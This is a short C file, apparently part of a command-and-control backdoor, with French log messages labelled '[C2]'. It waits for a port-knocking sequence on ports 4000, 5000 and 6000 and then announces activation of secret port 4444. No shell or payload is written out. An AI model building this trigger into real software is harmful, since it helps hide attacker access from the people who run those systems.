#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define KNOCK_PORTS {4000, 5000, 6000}
#define SECRET_PORT 4444

void wait_for_knock() {
    int knock_sequence[] = KNOCK_PORTS;
    int knock_index = 0;
    int sock_fd;
    struct sockaddr_in serv_addr, client_addr;
    socklen_t addr_size = sizeof(client_addr);

    printf("[C2] Attente de la séquence de port knocking...\n");

    while (knock_index < sizeof(knock_sequence) / sizeof(knock_sequence[0])) {
        sock_fd = socket(AF_INET, SOCK_STREAM, 0);
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(knock_sequence[knock_index]);

        bind(sock_fd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
        listen(sock_fd, 1);

        printf("[+] Attente sur le port %d...\n", knock_sequence[knock_index]);
        accept(sock_fd, (struct sockaddr*)&client_addr, &addr_size);
        printf("[+] Knock reçu sur %d\n", knock_sequence[knock_index]);

        close(sock_fd);
        knock_index++;
    }

    printf("[C2] Séquence correcte ! Activation du port %d\n", SECRET_PORT);
}